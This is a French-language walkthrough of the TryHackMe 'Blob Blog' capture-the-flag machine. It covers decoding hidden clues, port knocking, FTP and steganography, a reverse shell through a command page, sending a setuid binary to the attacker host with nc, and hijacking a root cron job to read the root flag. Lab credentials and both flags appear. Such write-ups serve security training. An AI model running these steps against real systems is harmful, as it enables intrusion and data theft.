# The Blob Blog #

## Task 1 Root The Box ##

```bash
tim@kali:~/Bureau/tryhackme/write-up$ sudo sh -c "echo '10.10.139.204 theblogblog.thm ' >> /etc/hosts"
tim@kali:~/Bureau/tryhackme/write-up$ sudo nmap -A theblogblog.thm -p-
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-05 20:15 CEST
Nmap scan report for theblogblog.thm (10.10.139.204)
Host is up (0.044s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 e7:28:a6:33:66:4e:99:9e:8e:ad:2f:1b:49:ec:3e:e8 (DSA)
|   2048 86:fc:ed:ce:46:63:4d:fd:ca:74:b6:50:46:ac:33:0f (RSA)
|   256 e0:cc:05:0a:1b:8f:5e:a8:83:7d:c3:d2:b3:cf:91:ca (ECDSA)
|_  256 80:e3:45:b2:55:e2:11:31:ef:b1:fe:39:a8:90:65:c5 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: specialized|storage-misc
Running (JUST GUESSING): Crestron 2-Series (87%), HP embedded (85%)
OS CPE: cpe:/o:crestron:2_series cpe:/h:hp:p2000_g3
Aggressive OS guesses: Crestron XPanel control system (87%), HP P2000 G3 NAS device (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   30.49 ms 10.9.0.1
2   46.28 ms theblogblog.thm (10.10.139.204)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 179.46 seconds

```

D'après le scan on voit 2 services : 
Le service SSH sur le port 22.   
Le service HTTP sur le port 80, avec la page par défaut d'Apache.    

```bash
tim@kali:~/Bureau/tryhackme/write-up$ curl http://theblogblog.thm -s | grep '<!-' -A 1
  <!--
    Modified from the Debian original for Ubuntu
--
<!--
K1stLS0+Kys8XT4rLisrK1stPisrKys8XT4uLS0tLisrKysrKysrKy4tWy0+KysrKys8XT4tLisrKytbLT4rKzxdPisuLVstPisrKys8XT4uLS1bLT4rKysrPF0+LS4tWy0+KysrPF0+LS4tLVstLS0+KzxdPi0tLitbLS0tLT4rPF0+KysrLlstPisrKzxdPisuLVstPisrKzxdPi4tWy0tLT4rKzxdPisuLS0uLS0tLS0uWy0+KysrPF0+Li0tLS0tLS0tLS0tLS4rWy0tLS0tPis8XT4uLS1bLS0tPis8XT4uLVstLS0tPis8XT4rKy4rK1stPisrKzxdPi4rKysrKysrKysrKysuLS0tLS0tLS0tLi0tLS0uKysrKysrKysrLi0tLS0tLS0tLS0uLS1bLS0tPis8XT4tLS0uK1stLS0tPis8XT4rKysuWy0+KysrPF0+Ky4rKysrKysrKysrKysrLi0tLS0tLS0tLS0uLVstLS0+KzxdPi0uKysrK1stPisrPF0+Ky4tWy0+KysrKzxdPi4tLVstPisrKys8XT4tLi0tLS0tLS0tLisrKysrKy4tLS0tLS0tLS0uLS0tLS0tLS0uLVstLS0+KzxdPi0uWy0+KysrPF0+Ky4rKysrKysrKysrKy4rKysrKysrKysrKy4tWy0+KysrPF0+LS4rWy0tLT4rPF0+KysrLi0tLS0tLS4rWy0tLS0+KzxdPisrKy4tWy0tLT4rKzxdPisuKysrLisuLS0tLS0tLS0tLS0tLisrKysrKysrLi1bKys+LS0tPF0+Ky4rKysrK1stPisrKzxdPi4tLi1bLT4rKysrKzxdPi0uKytbLS0+KysrPF0+LlstLS0+Kys8XT4tLS4rKysrK1stPisrKzxdPi4tLS0tLS0tLS0uWy0tLT4rPF0+LS0uKysrKytbLT4rKys8XT4uKysrKysrLi0tLS5bLS0+KysrKys8XT4rKysuK1stLS0tLT4rPF0+Ky4tLS0tLS0tLS0uKysrKy4tLS4rLi0tLS0tLS4rKysrKysrKysrKysrLisrKy4rLitbLS0tLT4rPF0+KysrLitbLT4rKys8XT4rLisrKysrKysrKysrLi4rKysuKy4rWysrPi0tLTxdPi4rK1stLS0+Kys8XT4uLlstPisrPF0+Ky5bLS0tPis8XT4rLisrKysrKysrKysrLi1bLT4rKys8XT4tLitbLS0tPis8XT4rKysuLS0tLS0tLitbLS0tLT4rPF0+KysrLi1bLS0tPisrPF0+LS0uKysrKysrKy4rKysrKysuLS0uKysrK1stPisrKzxdPi5bLS0tPis8XT4tLS0tLitbLS0tLT4rPF0+KysrLlstLT4rKys8XT4rLi0tLS0tLi0tLS0tLS0tLS0tLS4tLS1bLT4rKysrPF0+Li0tLS0tLS0tLS0tLS4tLS0uKysrKysrKysrLi1bLT4rKysrKzxdPi0uKytbLS0+KysrPF0+Li0tLS0tLS0uLS0tLS0tLS0tLS0tLi0tLVstPisrKys8XT4uLS0tLS0tLS0tLS0tLi0tLS4rKysrKysrKysuLVstPisrKysrPF0+LS4tLS0tLVstPisrPF0+LS4tLVstLS0+Kys8XT4tLg==
--
<!--      <div class="table_of_contents floating_element">
        <div class="section_header section_header_grey">
--
<!--
Dang it Bob, why do you always forget your password?
```

Dans le code source de page il y a une chaîne encodée.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ echo 'K1stLS0+Kys8XT4rLisrK1stPisrKys8XT4uLS0tLisrKysrKysrKy4tWy0+KysrKys8XT4tLisrKytbLT4rKzxdPisuLVstPisrKys8XT4uLS1bLT4rKysrPF0+LS4tWy0+KysrPF0+LS4tLVstLS0+KzxdPi0tLitbLS0tLT4rPF0+KysrLlstPisrKzxdPisuLVstPisrKzxdPi4tWy0tLT4rKzxdPisuLS0uLS0tLS0uWy0+KysrPF0+Li0tLS0tLS0tLS0tLS4rWy0tLS0tPis8XT4uLS1bLS0tPis8XT4uLVstLS0tPis8XT4rKy4rK1stPisrKzxdPi4rKysrKysrKysrKysuLS0tLS0tLS0tLi0tLS0uKysrKysrKysrLi0tLS0tLS0tLS0uLS1bLS0tPis8XT4tLS0uK1stLS0tPis8XT4rKysuWy0+KysrPF0+Ky4rKysrKysrKysrKysrLi0tLS0tLS0tLS0uLVstLS0+KzxdPi0uKysrK1stPisrPF0+Ky4tWy0+KysrKzxdPi4tLVstPisrKys8XT4tLi0tLS0tLS0tLisrKysrKy4tLS0tLS0tLS0uLS0tLS0tLS0uLVstLS0+KzxdPi0uWy0+KysrPF0+Ky4rKysrKysrKysrKy4rKysrKysrKysrKy4tWy0+KysrPF0+LS4rWy0tLT4rPF0+KysrLi0tLS0tLS4rWy0tLS0+KzxdPisrKy4tWy0tLT4rKzxdPisuKysrLisuLS0tLS0tLS0tLS0tLisrKysrKysrLi1bKys+LS0tPF0+Ky4rKysrK1stPisrKzxdPi4tLi1bLT4rKysrKzxdPi0uKytbLS0+KysrPF0+LlstLS0+Kys8XT4tLS4rKysrK1stPisrKzxdPi4tLS0tLS0tLS0uWy0tLT4rPF0+LS0uKysrKytbLT4rKys8XT4uKysrKysrLi0tLS5bLS0+KysrKys8XT4rKysuK1stLS0tLT4rPF0+Ky4tLS0tLS0tLS0uKysrKy4tLS4rLi0tLS0tLS4rKysrKysrKysrKysrLisrKy4rLitbLS0tLT4rPF0+KysrLitbLT4rKys8XT4rLisrKysrKysrKysrLi4rKysuKy4rWysrPi0tLTxdPi4rK1stLS0+Kys8XT4uLlstPisrPF0+Ky5bLS0tPis8XT4rLisrKysrKysrKysrLi1bLT4rKys8XT4tLitbLS0tPis8XT4rKysuLS0tLS0tLitbLS0tLT4rPF0+KysrLi1bLS0tPisrPF0+LS0uKysrKysrKy4rKysrKysuLS0uKysrK1stPisrKzxdPi5bLS0tPis8XT4tLS0tLitbLS0tLT4rPF0+KysrLlstLT4rKys8XT4rLi0tLS0tLi0tLS0tLS0tLS0tLS4tLS1bLT4rKysrPF0+Li0tLS0tLS0tLS0tLS4tLS0uKysrKysrKysrLi1bLT4rKysrKzxdPi0uKytbLS0+KysrPF0+Li0tLS0tLS0uLS0tLS0tLS0tLS0tLi0tLVstPisrKys8XT4uLS0tLS0tLS0tLS0tLi0tLS4rKysrKysrKysuLVstPisrKysrPF0+LS4tLS0tLVstPisrPF0+LS4tLVstLS0+Kys8XT4tLg==' | base64 -d
+[--->++<]>+.+++[->++++<]>.---.+++++++++.-[->+++++<]>-.++++[->++<]>+.-[->++++<]>.--[->++++<]>-.-[->+++<]>-.--[--->+<]>--.+[---->+<]>+++.[->+++<]>+.-[->+++<]>.-[--->++<]>+.--.-----.[->+++<]>.------------.+[----->+<]>.--[--->+<]>.-[---->+<]>++.++[->+++<]>.++++++++++++.---------.----.+++++++++.----------.--[--->+<]>---.+[---->+<]>+++.[->+++<]>+.+++++++++++++.----------.-[--->+<]>-.++++[->++<]>+.-[->++++<]>.--[->++++<]>-.--------.++++++.---------.--------.-[--->+<]>-.[->+++<]>+.+++++++++++.+++++++++++.-[->+++<]>-.+[--->+<]>+++.------.+[---->+<]>+++.-[--->++<]>+.+++.+.------------.++++++++.-[++>---<]>+.+++++[->+++<]>.-.-[->+++++<]>-.++[-->+++<]>.[--->++<]>--.+++++[->+++<]>.---------.[--->+<]>--.+++++[->+++<]>.++++++.---.[-->+++++<]>+++.+[----->+<]>+.---------.++++.--.+.------.+++++++++++++.+++.+.+[---->+<]>+++.+[->+++<]>+.+++++++++++..+++.+.+[++>---<]>.++[--->++<]>..[->++<]>+.[--->+<]>+.+++++++++++.-[->+++<]>-.+[--->+<]>+++.------.+[---->+<]>+++.-[--->++<]>--.+++++++.++++++.--.++++[->+++<]>.[--->+<]>----.+[---->+<]>+++.[-->+++<]>+.-----.------------.---[->++++<]>.------------.---.+++++++++.-[->+++++<]>-.++[-->+++<]>.-------.------------.---[->++++<]>.------------.---.+++++++++.-[->+++++<]>-.-----[->++<]>-.--[--->++<]>-.

tim@kali:~/Bureau/tryhackme/write-up$ echo "+[--->++<]>+.+++[->++++<]>.---.+++++++++.-[->+++++<]>-.++++[->++<]>+.-[->++++<]>.--[->++++<]>-.-[->+++<]>-.--[--->+<]>--.+[---->+<]>+++.[->+++<]>+.-[->+++<]>.-[--->++<]>+.--.-----.[->+++<]>.------------.+[----->+<]>.--[--->+<]>.-[---->+<]>++.++[->+++<]>.++++++++++++.---------.----.+++++++++.----------.--[--->+<]>---.+[---->+<]>+++.[->+++<]>+.+++++++++++++.----------.-[--->+<]>-.++++[->++<]>+.-[->++++<]>.--[->++++<]>-.--------.++++++.---------.--------.-[--->+<]>-.[->+++<]>+.+++++++++++.+++++++++++.-[->+++<]>-.+[--->+<]>+++.------.+[---->+<]>+++.-[--->++<]>+.+++.+.------------.++++++++.-[++>---<]>+.+++++[->+++<]>.-.-[->+++++<]>-.++[-->+++<]>.[--->++<]>--.+++++[->+++<]>.---------.[--->+<]>--.+++++[->+++<]>.++++++.---.[-->+++++<]>+++.+[----->+<]>+.---------.++++.--.+.------.+++++++++++++.+++.+.+[---->+<]>+++.+[->+++<]>+.+++++++++++..+++.+.+[++>---<]>.++[--->++<]>..[->++<]>+.[--->+<]>+.+++++++++++.-[->+++<]>-.+[--->+<]>+++.------.+[---->+<]>+++.-[--->++<]>--.+++++++.++++++.--.++++[->+++<]>.[--->+<]>----.+[---->+<]>+++.[-->+++<]>+.-----.------------.---[->++++<]>.------------.---.+++++++++.-[->+++++<]>-.++[-->+++<]>.-------.------------.---[->++++<]>.------------.---.+++++++++.-[->+++++<]>-.-----[->++<]>-.--[--->++<]>-."  > bf

tim@kali:~/Bureau/tryhackme/write-up$ beef bf
When I was a kid, my friends and I would always knock on 3 of our neighbors doors.  Always houses 1, then 3, then 5
```

On decode la chaîne en base64, puis en brainfuck et on obtient une phrase qui dit de frapper à la porte des voisins.    
Il exite un logiciel qui frappe au port qui a comme nom knock.    

```bash
tim@kali:~/Bureau/tryhackme/write-up$ sudo knock theblogblog.thm 1 3 5
```

On frape les ports 1,3 et 5 comme dit dans la phrase.  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ sudo nmap -A theblogblog.thm -p-
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-05 20:36 CEST
Nmap scan report for theblogblog.thm (10.10.139.204)
Host is up (0.032s latency).
Not shown: 65529 closed ports
PORT     STATE    SERVICE VERSION
21/tcp   open     ftp     vsftpd 3.0.2
22/tcp   open     ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 e7:28:a6:33:66:4e:99:9e:8e:ad:2f:1b:49:ec:3e:e8 (DSA)
|   2048 86:fc:ed:ce:46:63:4d:fd:ca:74:b6:50:46:ac:33:0f (RSA)
|   256 e0:cc:05:0a:1b:8f:5e:a8:83:7d:c3:d2:b3:cf:91:ca (ECDSA)
|_  256 80:e3:45:b2:55:e2:11:31:ef:b1:fe:39:a8:90:65:c5 (ED25519)
80/tcp   open     http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
445/tcp  open     http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
5355/tcp filtered llmnr
8080/tcp open     http    Werkzeug httpd 1.0.1 (Python 3.5.3)
|_http-title: Apache2 Ubuntu Default Page: It works
Aggressive OS guesses: Crestron XPanel control system (92%), ASUS RT-N56U WAP (Linux 3.4) (92%), Linux 3.16 (92%), Linux 4.10 (89%), Linux 3.1 (89%), Linux 3.2 (89%), Linux 3.10 - 3.13 (89%), Linux 5.4 (89%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (88%), FreeBSD 11.1-STABLE (86%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   31.78 ms 10.9.0.1
2   31.87 ms theblogblog.thm (10.10.139.204)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 92.70 seconds

```

Des nouveaux ports et services apparaisent.
Le service FTP sur le port 21.   
Le service HTTP sur le port 445 et 8080.    
Un service inconnu sur le port 5355.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ curl theblogblog.thm -s | grep '<!--' -A 4
  <!--
    Modified from the Debian original for Ubuntu
    Last updated: 2014-03-19
    See: https://launchpad.net/bugs/1288690
  -->
<!--
K1stLS0+Kys8XT4rLisrK1stPisrKys8XT4uLS0tLisrKysrKysrKy4tWy0+KysrKys8XT4tLisrKytbLT4rKzxdPisuLVstPisrKys8XT4uLS1bLT4rKysrPF0+LS4tWy0+KysrPF0+LS4tLVstLS0+KzxdPi0tLitbLS0tLT4rPF0+KysrLlstPisrKzxdPisuLVstPisrKzxdPi4tWy0tLT4rKzxdPisuLS0uLS0tLS0uWy0+KysrPF0+Li0tLS0tLS0tLS0tLS4rWy0tLS0tPis8XT4uLS1bLS0tPis8XT4uLVstLS0tPis8XT4rKy4rK1stPisrKzxdPi4rKysrKysrKysrKysuLS0tLS0tLS0tLi0tLS0uKysrKysrKysrLi0tLS0tLS0tLS0uLS1bLS0tPis8XT4tLS0uK1stLS0tPis8XT4rKysuWy0+KysrPF0+Ky4rKysrKysrKysrKysrLi0tLS0tLS0tLS0uLVstLS0+KzxdPi0uKysrK1stPisrPF0+Ky4tWy0+KysrKzxdPi4tLVstPisrKys8XT4tLi0tLS0tLS0tLisrKysrKy4tLS0tLS0tLS0uLS0tLS0tLS0uLVstLS0+KzxdPi0uWy0+KysrPF0+Ky4rKysrKysrKysrKy4rKysrKysrKysrKy4tWy0+KysrPF0+LS4rWy0tLT4rPF0+KysrLi0tLS0tLS4rWy0tLS0+KzxdPisrKy4tWy0tLT4rKzxdPisuKysrLisuLS0tLS0tLS0tLS0tLisrKysrKysrLi1bKys+LS0tPF0+Ky4rKysrK1stPisrKzxdPi4tLi1bLT4rKysrKzxdPi0uKytbLS0+KysrPF0+LlstLS0+Kys8XT4tLS4rKysrK1stPisrKzxdPi4tLS0tLS0tLS0uWy0tLT4rPF0+LS0uKysrKytbLT4rKys8XT4uKysrKysrLi0tLS5bLS0+KysrKys8XT4rKysuK1stLS0tLT4rPF0+Ky4tLS0tLS0tLS0uKysrKy4tLS4rLi0tLS0tLS4rKysrKysrKysrKysrLisrKy4rLitbLS0tLT4rPF0+KysrLitbLT4rKys8XT4rLisrKysrKysrKysrLi4rKysuKy4rWysrPi0tLTxdPi4rK1stLS0+Kys8XT4uLlstPisrPF0+Ky5bLS0tPis8XT4rLisrKysrKysrKysrLi1bLT4rKys8XT4tLitbLS0tPis8XT4rKysuLS0tLS0tLitbLS0tLT4rPF0+KysrLi1bLS0tPisrPF0+LS0uKysrKysrKy4rKysrKysuLS0uKysrK1stPisrKzxdPi5bLS0tPis8XT4tLS0tLitbLS0tLT4rPF0+KysrLlstLT4rKys8XT4rLi0tLS0tLi0tLS0tLS0tLS0tLS4tLS1bLT4rKysrPF0+Li0tLS0tLS0tLS0tLS4tLS0uKysrKysrKysrLi1bLT4rKysrKzxdPi0uKytbLS0+KysrPF0+Li0tLS0tLS0uLS0tLS0tLS0tLS0tLi0tLVstPisrKys8XT4uLS0tLS0tLS0tLS0tLi0tLS4rKysrKysrKysuLVstPisrKysrPF0+LS4tLS0tLVstPisrPF0+LS4tLVstLS0+Kys8XT4tLg==
-->
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
--
<!--      <div class="table_of_contents floating_element">
        <div class="section_header section_header_grey">
          TABLE OF CONTENTS
        </div>
        <div class="table_of_contents_item floating_element">
--
<!--
Dang it Bob, why do you always forget your password?
I'll encode for you here so nobody else can figure out what it is: 
HcfP8J54AK4
-->
```

Encore dans la page principale on trouve des identifiants.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ ftp theblogblog.thm
Connected to theblogblog.thm.
220 (vsFTPd 3.0.2)
Name (theblogblog.thm:tim): bob
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.
ftp> 
``` 

Le mot de pase ne fonctionne pas, il doit être encodé.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ echo 'HcfP8J54AK4' | base58 -d
cUpC4k3s
```

On décode le mot de passe qui est encodé en base58.    

```bash
tim@kali:~/Bureau/tryhackme/write-up$ ftp theblogblog.thm
Connected to theblogblog.thm.
220 (vsFTPd 3.0.2)
Name (theblogblog.thm:tim): bob 
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 1001     1001         8980 Jul 25  2020 examples.desktop
dr-xr-xr-x    3 65534    65534        4096 Jul 25  2020 ftp
226 Directory send OK.
ftp> cd ftp
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 1001     1001         4096 Jul 28  2020 files
226 Directory send OK.
ftp> cd files
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 1001     1001         8183 Jul 28  2020 cool.jpeg
226 Directory send OK.
ftp> get cool.jpeg
local: cool.jpeg remote: cool.jpeg
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for cool.jpeg (8183 bytes).
226 Transfer complete.
8183 bytes received in 0.05 secs (155.0487 kB/s)
ftp> exit
221 Goodbye.
```

On se connecte sur le serveur ftp et on télécharge un fichier cool.jpeg.    

```bash
tim@kali:~/Bureau/tryhackme/write-up$ steghide extract -sf cool.jpeg 
Entrez la passphrase: 
steghide: impossible d'extraire des donn�es avec cette passphrase!
```

On regarde si il y a des informations cachés dans le fichier.   
Oui il y  a des informations cachés mais il faut un mot de passe les extraires.    

```bash
tim@kali:~/Bureau/tryhackme/write-up$ curl theblogblog.thm:445 -s | grep '<!--' -A 4
  <!--
    Modified from the Debian original for Ubuntu
    Last updated: 2014-03-19
    See: https://launchpad.net/bugs/1288690
  -->
<!--
Bob, I swear to goodness, if you can't remember p@55w0rd 
It's not that hard
-->
  <head>
--
<!--      <div class="table_of_contents floating_element">
        <div class="section_header section_header_grey">
          TABLE OF CONTENTS
        </div>
        <div class="table_of_contents_item floating_element">
```

Sur la page du port 445 on trouve un autre mot de passe qui est : p@55w0rd     

```bash
tim@kali:~/Bureau/tryhackme/write-up$ steghide extract -sf cool.jpeg 
Entrez la passphrase: 
�criture des donn�es extraites dans "out.txt".

tim@kali:~/Bureau/tryhackme/write-up$ cat out.txt 
zcv:p1fd3v3amT@55n0pr
/bobs_safe_for_stuff
```

Avec le mot de passe on extrait les informations.    
On trouve des identifiants et un répertoire.    
Les identifiants sont chiffrés car on souspsone que zcv c'est bob.   d1ff3r3ntP@55w0rd 

```bash
tim@kali:~/Bureau/tryhackme/write-up$ curl theblogblog.thm:445/bobs_safe_for_stuff -s 
Remember this next time bob, you need it to get into the blog! I'm taking this down tomorrow, so write it down!
- youmayenter
```

On trouve une nouvelle page avec un mot de passe qui est : youmayenter   

![vigenère](./Task1-01.png)

On décode les identifiants avec l'algorithme vigenère.   

Les identiants sont : bob:d1ff3r3ntP@55w0rd   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ gobuster dir -u http://theblogblog.thm:8080 -w /usr/share/dirb/wordlists/common.txt -q 
/blog                 (Status: 302) [Size: 219] [--> http://theblogblog.thm:8080/login]
/login                (Status: 200) [Size: 546]                                        
/review               (Status: 302) [Size: 219] [--> http://theblogblog.thm:8080/login]
```

On est encore sur une page par defaut d'apache on fait une recherche de repértoires cachés avec gobuster.    
On trouve un page d'identification login.    

![page2](Task1-02.png)

On se connecte

![page3](Task1-03.png)
![page4](Task1-04.png)

Quand on soumet une commande on trouve le résultat dans rewiew.

```bash
tim@kali:~/Bureau/tryhackme/write-up$ nc -lvnp 1234
listening on [any] 1234 ...
```

On écoute le port 1234, car on va lancer un reverse shell sur ce port.    

![page5](Task1-05.png)
Puis allez dans review.   

On lance le shell.   

```bash
www-data@bobloblaw-VirtualBox:~/html2$ find / -perm -4000 2>/dev/null
find / -perm -4000 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/ubuntu-app-launch/oom-adjust-setuid-helper
/usr/lib/x86_64-linux-gnu/oxide-qt/chrome-sandbox
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/sbin/pppd
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/traceroute6.iputils
/usr/bin/chsh
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/arping
/usr/bin/blogFeedback
/usr/bin/passwd
/bin/ntfs-3g
/bin/su
/bin/fusermount
/bin/mount
/bin/ping
/bin/umount
/opt/VBoxGuestAdditions-6.1.12/bin/VBoxDRMClient
```

On cherche un setuid.
On trouve un fichier blogFeedback qui est pas un fichier standart du système.   

```bash
www-data@bobloblaw-VirtualBox:~/html2$ cd /usr/bin
cd /usr/bin
---------------
www-data@bobloblaw-VirtualBox:/usr/bin$ nc 10.9.228.66 4444 < blogFeedback
nc 10.9.228.66 4444 < blogFeedback
```

On transfer le fichier blogFeedback pour analyse.    

```cpp
undefined8 main(int param_1,long param_2)

{
  int iVar1;
  int local_c;
  
  if ((param_1 < 7) || (7 < param_1)) {
    puts("Order my blogs!");
  }
  else {
    local_c = 1;
    while (local_c < 7) {
      iVar1 = atoi(*(char **)(param_2 + (long)local_c * 8));
      if (iVar1 != 7 - local_c) {
        puts("Hmm... I disagree!");
        return 0;
      }
      local_c = local_c + 1;
    }
    puts("Now that, I can get behind!");
    setreuid(1000,1000);
    system("/bin/sh");
  }
  return 0;
}
```

On décompile de ficher avec ghidra dans la fonction main on trouve le code ci-dessus.    

```cpp
if ((param_1 < 7) || (7 < param_1)) {
```

Si on done moins de 7 paramètre  le programme affiche un messsage puis quite.  

```cpp
local_c = 1;
    while (local_c < 7) {
      iVar1 = atoi(*(char **)(param_2 + (long)local_c * 8));
      if (iVar1 != 7 - local_c) {
        puts("Hmm... I disagree!");
        return 0;
      }
      local_c = local_c + 1;
    }
```

La boucle lit toutes les valeurs passés. 
Il vérifie si la valeur entrée est égale à la valeur que le programme calcul. (6 5 4 3 2 1)
Si toutes les valeurs sont bonne alors on a le shell avec les droits 1000.   

```bash
www-data@bobloblaw-VirtualBox:/usr/bin$ ./blogFeedback 6 5 4 3 2 1
./blogFeedback 6 5 4 3 2 1
id
uid=1000(bobloblaw) gid=33(www-data) groups=33(www-data)
```

On met plus de 6 paramètres blogFeedback 6 5 4 3 2 1  
Avec les bonnes valeurs 6 5 4 3 2 1.   

**User Flag**

On obtient un shell avec les droits de bobloblaw.   

```bash
cd /home/bobloblaw/
/home/bobloblaw
ls
Desktop
Documents
Downloads
examples.desktop
Music
Pictures
Public
Templates
Videos
cd Desktop
ls
dontlookatthis.jpg
lookatme.jpg
user.txt
cat user.txt
THM{C0NGR4t$_g3++ing_this_fur}

@jakeyee thank you so so so much for the help with the foothold on the box!!
```

Dans le bureau de bobloblaw on trouve le fichier user.txt.   
On lit le flag.  

La solution est : THM{C0NGR4t$_g3++ing_this_fur}   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64 -nv
2021-09-05 22:13:16 URL:https://github-releases.githubusercontent.com/120821432/d54f2200-c51c-11e9-8d82-f178cd27b2cb?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20210905%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20210905T201257Z&X-Amz-Expires=300&X-Amz-Signature=cfd0523c0bf2bc9d8040ecc5260441ae5cbac5d722de31a0f4c4d261ca29035b&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=120821432&response-content-disposition=attachment%3B%20filename%3Dpspy64&response-content-type=application%2Foctet-stream [3078592/3078592] -> "pspy64" [1]
```

On télécharge pspy64.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ python3 -m http.server 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
--------------------------------------------------------------
cd /tmp
wget http://10.9.228.66:8000/pspy64 -nv
2021-09-05 16:20:06 URL:http://10.9.228.66:8000/pspy64 [3078592/3078592] -> "pspy64" [1]
chmod +x pspy64
./pspy64
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
...
2021/09/05 16:22:01 CMD: UID=0    PID=12177  | /usr/sbin/CRON -f 
2021/09/05 16:22:01 CMD: UID=0    PID=12176  | /bin/sh -c gcc /home/bobloblaw/Documents/.boring_file.c -o /home/bobloblaw/Documents/.also_boring/.still_boring && chmod +x /home/bobloblaw/Documents/.also_boring/.still_boring && /home/bobloblaw/Documents/.also_boring/.still_boring | tee /dev/pts/0 /dev/pts/1 /dev/pts/2 && rm /home/bobloblaw/Documents/.also_boring/.still_boring 
```

On télécharge pspy et on le transfer sur la machine cîble et on le lance.   
On voit que régulièrement un tâche CRON exécute un scripte qui compile un fichier .boring_file.c et le lance.   

```bash
python3 -c "import pty;pty.spawn('/bin/bash')"

cd /home
bobloblaw@bobloblaw-VirtualBox:/home$ cd bobloblaw/Documents
cd bobloblaw/Documents
bobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Documents$ 

cat .boring_file.c
#include <stdio.h>
int main() {
	printf("You haven't rooted me yet? Jeez\n");
	return 0;

}

bobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Documents$ sed -i 3d .boring_file.c
bobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Documents$ sed -i '1i#include <stdlib.h>' .boring_file.c
bobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Documents$ sed -i '4i	system("cat /root/root.txt");' .boring_file.c

THM{G00D_J0B_G3++1NG+H3R3!}
```

On stabilise le shell.  
On modifie le fichier .boring_file.c pour qu'il nous affiche le flag.  

La réponse est : THM{G00D_J0B_G3++1NG+H3R3!}  